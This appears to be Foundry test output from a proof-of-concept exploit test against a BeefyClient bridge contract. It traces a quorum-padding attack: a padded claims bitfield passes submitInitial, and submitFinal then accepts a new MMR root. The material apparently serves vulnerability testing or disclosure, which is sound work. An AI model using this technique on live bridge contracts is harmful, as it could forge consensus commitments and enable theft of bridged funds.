    │   └─ ← [Return] 0x43958f3FA5F3cA8F629Bb910F27b7B337F5e05Fd
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0xF4Db3846bD9Ffc18802893AF70dFF7d47694e7c3
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x75f2D8Ff6AcA5500F01153305F0e553678cB595f
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x60CA79f54E122F14382207413BFb73eE44a96e92
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x30b017dfdAfA4b399d4585e5373bF232718163cA
    ├─ [4445012] → new BeefyClient@0x2e234DAe75C793f67A35089C9d99245E1C58470b
    │   └─ ← [Return] 21192 bytes of code
    ├─ [0] VM::sign("<pk>", 0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9) [staticcall]
    │   └─ ← [Return] 27, 0x65d37e7a824cfdc5915d62ff23e824efc64a540df25ba475836a3a905e574274, 0x6ef505b0f2db2f973796f04c3be705eb754cd0cb298d4ea00959de058c3819c0
    ├─ [0] VM::sign("<pk>", 0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9) [staticcall]
    │   └─ ← [Return] 27, 0xa21bfcae87660b90a86ffd1f3f4dd4f6d9e71dbf988c15df3241f60318459f38, 0x31161950ab356805ddab871a82944943fbbeae773b6842e46aeec680106b3358
    ├─ [0] VM::sign("<pk>", 0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9) [staticcall]
    │   └─ ← [Return] 28, 0xcf2f6f2b43da64cd778410af0ac1c9e2f6ec5b0ca5480729d74a4745d04aed6d, 0x650bfe43d0bcd65de7c45b0c756e287f8c9052bde134ea3764f5738a9844548c
    ├─ [0] VM::sign("<pk>", 0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9) [staticcall]
    │   └─ ← [Return] 28, 0x4f60e63654750ae08adfbe5684437ede847b17e2cbe200d68688fe5fc52135b6, 0x44ae6551a7c16a0a2cf309232fc3a16751562f25640db6d5b29e334f670d8448
    ├─ [0] VM::sign("<pk>", 0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9) [staticcall]
    │   └─ ← [Return] 28, 0xf89679c41e26832fa2a6517f5955911caf06974b22f5005941346fe38092a8b7, 0x31ca9d7d40cd07c89aadb9d03503a2ab51b08e7c902c5acd26ad4ca9afddbfd5
    ├─ [0] VM::sign("<pk>", 0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9) [staticcall]
    │   └─ ← [Return] 28, 0x4ceba77561d8dc2acfc8a2665d6a23bbc3233797ffcbc5a6f8926e1f166b027b, 0x5a866197ea06bd3fedb5ea9138c855d10ac4c5b10df6eb94a88118b836424bab
    ├─ [0] VM::sign("<pk>", 0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9) [staticcall]
    │   └─ ← [Return] 28, 0x90681be155ac4f878683330752abc3d3e33589db0f79b0c8754f96bd83b95da8, 0x7f57181936cbffcd28e7009aac684cd28381eff58b3dd7c6d52c63d71d3452d4
    ├─ [0] VM::sign("<pk>", 0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9) [staticcall]
    │   └─ ← [Return] 27, 0x205094fe4bf1ccb0beafeb5f40ca3410c5232f115c40b0fe76869a9313bb6f70, 0x1545078ab46ce89cda9c0c980c520a687dcb06b9e9ba518f575b84ebc2ee2bf1
    ├─ [0] VM::expectRevert(custom error 0xc31eb0e0: ee3e74af00000000000000000000000000000000000000000000000000000000)
    │   └─ ← [Return]
    ├─ [66216] BeefyClient::submitInitial(Commitment({ blockNumber: 1, validatorSetID: 0, payload: [PayloadItem({ payloadID: 0x6d68, data: 0xea18a9d5e4d047e572a687be66df544e24c4cb58006e47bc2ee031c68d9243b5 })] }), [255], ValidatorProof({ v: 27, r: 0x65d37e7a824cfdc5915d62ff23e824efc64a540df25ba475836a3a905e574274, s: 0x6ef505b0f2db2f973796f04c3be705eb754cd0cb298d4ea00959de058c3819c0, index: 0, account: 0x35A6f2deD2819AD102b0E9869245cEc9079E3c5A, proof: [0x0f04384019ab1ed43bd3bf56bb028ed8dd27b2dd7c7668ae922f9601ce8729aa, 0x4dd5dee2163795a45b9bb3e484596674bc510b98024a48f53fa1d3577229ef21, 0xff74a06e3c6ed873b4a85a55ced247e4bbfc70843eba4574ee9112269bf7c40c, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] }))
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 27, 46057275360453603621643198585907386754034073144837865149273906125136457056884, 50187330154288096686742777099146764610807286027905257036073807901112248310208) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000035a6f2ded2819ad102b0e9869245cec9079e3c5a
    │   └─ ← [Revert] NotEnoughClaims()
    ├─ [155199] BeefyClient::submitInitial(Commitment({ blockNumber: 1, validatorSetID: 0, payload: [PayloadItem({ payloadID: 0x6d68, data: 0xea18a9d5e4d047e572a687be66df544e24c4cb58006e47bc2ee031c68d9243b5 })] }), [255, 0, 0, 0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]], ValidatorProof({ v: 27, r: 0x65d37e7a824cfdc5915d62ff23e824efc64a540df25ba475836a3a905e574274, s: 0x6ef505b0f2db2f973796f04c3be705eb754cd0cb298d4ea00959de058c3819c0, index: 0, account: 0x35A6f2deD2819AD102b0E9869245cEc9079E3c5A, proof: [0x0f04384019ab1ed43bd3bf56bb028ed8dd27b2dd7c7668ae922f9601ce8729aa, 0x4dd5dee2163795a45b9bb3e484596674bc510b98024a48f53fa1d3577229ef21, 0xff74a06e3c6ed873b4a85a55ced247e4bbfc70843eba4574ee9112269bf7c40c, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] }))
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 27, 46057275360453603621643198585907386754034073144837865149273906125136457056884, 50187330154288096686742777099146764610807286027905257036073807901112248310208) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000035a6f2ded2819ad102b0e9869245cec9079e3c5a
    │   ├─ emit NewTicket(relayer: BeefyQuorumPaddingExploitTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], blockNumber: 1)
    │   └─ ← [Return]
    ├─ [0] VM::roll(2)
    │   └─ ← [Return]
    ├─ [0] VM::prevrandao(0x000000000000000000000000000000000000000000000000000000000001e240)
    │   └─ ← [Return]
    ├─ [23367] BeefyClient::commitPrevRandao(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9)
    │   └─ ← [Return]
    ├─ [2473] BeefyClient::tickets(0xbed3aaa24e2116b0b45e1d0ffefef3bcbfdbadf41290ec345ccf0d30599efc92) [staticcall]
    │   └─ ← [Return] 1, 20, 8, 123456 [1.234e5], 0x5120e43af2c95d577f074dcdf4fa8aa4959585fbe4ba4ba3362d6c2ff6d670be
    ├─ [303755] BeefyClient::submitFinal(Commitment({ blockNumber: 1, validatorSetID: 0, payload: [PayloadItem({ payloadID: 0x6d68, data: 0xea18a9d5e4d047e572a687be66df544e24c4cb58006e47bc2ee031c68d9243b5 })] }), [255, 0, 0, 0, 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]], [ValidatorProof({ v: 27, r: 0x65d37e7a824cfdc5915d62ff23e824efc64a540df25ba475836a3a905e574274, s: 0x6ef505b0f2db2f973796f04c3be705eb754cd0cb298d4ea00959de058c3819c0, index: 0, account: 0x35A6f2deD2819AD102b0E9869245cEc9079E3c5A, proof: [0x0f04384019ab1ed43bd3bf56bb028ed8dd27b2dd7c7668ae922f9601ce8729aa, 0x4dd5dee2163795a45b9bb3e484596674bc510b98024a48f53fa1d3577229ef21, 0xff74a06e3c6ed873b4a85a55ced247e4bbfc70843eba4574ee9112269bf7c40c, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] }), ValidatorProof({ v: 27, r: 0xa21bfcae87660b90a86ffd1f3f4dd4f6d9e71dbf988c15df3241f60318459f38, s: 0x31161950ab356805ddab871a82944943fbbeae773b6842e46aeec680106b3358, index: 1, account: 0x493739E867Ea612Eb8bcA5833dA0890cd9b4bA55, proof: [0x99a90671807bd13eb25b7824bcb881c20d034e732ad2992f116e3f8ecb12a5c0, 0x4dd5dee2163795a45b9bb3e484596674bc510b98024a48f53fa1d3577229ef21, 0xff74a06e3c6ed873b4a85a55ced247e4bbfc70843eba4574ee9112269bf7c40c, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] }), ValidatorProof({ v: 28, r: 0xcf2f6f2b43da64cd778410af0ac1c9e2f6ec5b0ca5480729d74a4745d04aed6d, s: 0x650bfe43d0bcd65de7c45b0c756e287f8c9052bde134ea3764f5738a9844548c, index: 2, account: 0x07e9e294E70A8da657753e5811868e1555f79e55, proof: [0x244caa6d2a906504bca5c5935e451a0fea25b5b8747222aad68c95fc208e54df, 0xfcb2de10a07751e76c80e34f41a9daeceb256da399d27769bf82e695b709af47, 0xff74a06e3c6ed873b4a85a55ced247e4bbfc70843eba4574ee9112269bf7c40c, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] }), ValidatorProof({ v: 28, r: 0x4f60e63654750ae08adfbe5684437ede847b17e2cbe200d68688fe5fc52135b6, s: 0x44ae6551a7c16a0a2cf309232fc3a16751562f25640db6d5b29e334f670d8448, index: 3, account: 0x76a8A03f5675200222Bdb477f1ed4bE0014Fe7eD, proof: [0x970bc1f767f274cdfc9a0b274453a3bbb3291265d95855ed5faacf834f9b5809, 0xfcb2de10a07751e76c80e34f41a9daeceb256da399d27769bf82e695b709af47, 0xff74a06e3c6ed873b4a85a55ced247e4bbfc70843eba4574ee9112269bf7c40c, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] }), ValidatorProof({ v: 28, r: 0xf89679c41e26832fa2a6517f5955911caf06974b22f5005941346fe38092a8b7, s: 0x31ca9d7d40cd07c89aadb9d03503a2ab51b08e7c902c5acd26ad4ca9afddbfd5, index: 4, account: 0xc70b896c764ade1EC8e4176C7Bd27d9CfC7ea86e, proof: [0x855e617261746b7cc78b46b9cfb313991d868330b4c35830d3809104cbb53b19, 0xc399ff0b9437996f9c6145f1729d616587bfdfd65ec8574a1d2d9b44851de019, 0x46616d5b771c5d24df7b3afb6dab1ac66cf4b1b1cc2745f1e0b134e364f4efd2, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] }), ValidatorProof({ v: 28, r: 0x4ceba77561d8dc2acfc8a2665d6a23bbc3233797ffcbc5a6f8926e1f166b027b, s: 0x5a866197ea06bd3fedb5ea9138c855d10ac4c5b10df6eb94a88118b836424bab, index: 5, account: 0x4325390E922DC44bACAd7D94E3e843060f04cde2, proof: [0x41b08867c471093a1e82f989127abd2cd1d85bc7d3ab840a63a9085c6fcd29c7, 0xc399ff0b9437996f9c6145f1729d616587bfdfd65ec8574a1d2d9b44851de019, 0x46616d5b771c5d24df7b3afb6dab1ac66cf4b1b1cc2745f1e0b134e364f4efd2, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] }), ValidatorProof({ v: 28, r: 0x90681be155ac4f878683330752abc3d3e33589db0f79b0c8754f96bd83b95da8, s: 0x7f57181936cbffcd28e7009aac684cd28381eff58b3dd7c6d52c63d71d3452d4, index: 6, account: 0x21c03325b9C6F8f1121699c765693fB210c3428F, proof: [0x987e79d991d2db7df844c41274d36ba5d368e9c761e56bb2886cb0b8b86247e1, 0xc6795f10fb6b3fb1b62d625a50160e058d657fa4c98cf9b1d22fe1a48811f37f, 0x46616d5b771c5d24df7b3afb6dab1ac66cf4b1b1cc2745f1e0b134e364f4efd2, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] }), ValidatorProof({ v: 27, r: 0x205094fe4bf1ccb0beafeb5f40ca3410c5232f115c40b0fe76869a9313bb6f70, s: 0x1545078ab46ce89cda9c0c980c520a687dcb06b9e9ba518f575b84ebc2ee2bf1, index: 7, account: 0x85424EAcf2e5EaDD3a8BBa726CD8dEBC1f8986Fd, proof: [0x702fa71ce17779e55605dea4c6688eb93a58b540f8c247a553774f630517999e, 0xc6795f10fb6b3fb1b62d625a50160e058d657fa4c98cf9b1d22fe1a48811f37f, 0x46616d5b771c5d24df7b3afb6dab1ac66cf4b1b1cc2745f1e0b134e364f4efd2, 0xd2c1f3df6dd4cf08506bf4994bdb6e6c1f4f15a79ee4ea8e26ac0d507123be8f, 0x8a5cc586471b82fa98fdbe12799dda5a60487dbb52d4b31a0b9d6e9a87fa5401] })], MMRLeaf({ version: 0, parentNumber: 0, parentHash: 0x0000000000000000000000000000000000000000000000000000000000000000, nextAuthoritySetID: 0, nextAuthoritySetLen: 0, nextAuthoritySetRoot: 0x0000000000000000000000000000000000000000000000000000000000000000, parachainHeadsRoot: 0x0000000000000000000000000000000000000000000000000000000000000000 }), [], 0)
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 27, 46057275360453603621643198585907386754034073144837865149273906125136457056884, 50187330154288096686742777099146764610807286027905257036073807901112248310208) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000035a6f2ded2819ad102b0e9869245cec9079e3c5a
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 27, 73324130286607420925481142922605506733688128189201332768116760911039833677624, 22202374934489952590774815680753765825672055723512831153742447528859746906968) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000493739e867ea612eb8bca5833da0890cd9b4ba55
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 28, 93712568729048692420534572301996781658459791967377756343546728785025870523757, 45704787896493618811074866109191116567834451044548566074315397463582263497868) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000007e9e294e70a8da657753e5811868e1555f79e55
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 28, 35903921222688032420255124921557209843722516493179126964980518563871360890294, 31065404370736977871723553168876109778090827833754935834314869810326720578632) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000076a8a03f5675200222bdb477f1ed4be0014fe7ed
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 28, 112439453906999542237012570836689781556602484378405083915462794537476126058679, 22521319638659397460343048824853484986682910481969993084363138255239379795925) [staticcall]
    │   │   └─ ← [Return] 0x000000000000000000000000c70b896c764ade1ec8e4176c7bd27d9cfc7ea86e
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 28, 34792141308809343247650312954085223311714033213347000919190804750800857531003, 40945587444167712498052111431958816291339974577824606992388295795478811003819) [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000004325390e922dc44bacad7d94e3e843060f04cde2
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 28, 65316994712889104636756196851445416073580140272861540532111802045841008057768, 57597613786392324575779012389232175160116259985966963405898671400516538618580) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000021c03325b9c6f8f1121699c765693fb210c3428f
    │   ├─ [3000] PRECOMPILES::ecrecover(0x282fad9aa61573fcae37e79ca26cb32abd0679c6e5eccfe5aaad540cda0c2bc9, 27, 14616387234130466083543047221252149888329501120557932634412042999517842993008, 9620534319416385192918254563729142277335664727154642773787953768036662389745) [staticcall]
    │   │   └─ ← [Return] 0x00000000000000000000000085424eacf2e5eadd3a8bba726cd8debc1f8986fd
    │   ├─ emit NewMMRRoot(mmrRoot: 0xea18a9d5e4d047e572a687be66df544e24c4cb58006e47bc2ee031c68d9243b5, blockNumber: 1)
    │   └─ ← [Return]
    ├─ [685] BeefyClient::latestMMRRoot() [staticcall]
    │   └─ ← [Return] 0xea18a9d5e4d047e572a687be66df544e24c4cb58006e47bc2ee031c68d9243b5
    ├─ [786] BeefyClient::latestBeefyBlock() [staticcall]
    │   └─ ← [Return] 1
    └─ ← [Return]

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 33.04ms (19.87ms CPU time)

Ran 1 test suite in 1.62s (33.04ms CPU time): 2 tests passed, 0 failed, 0 skipped (2 total tests)
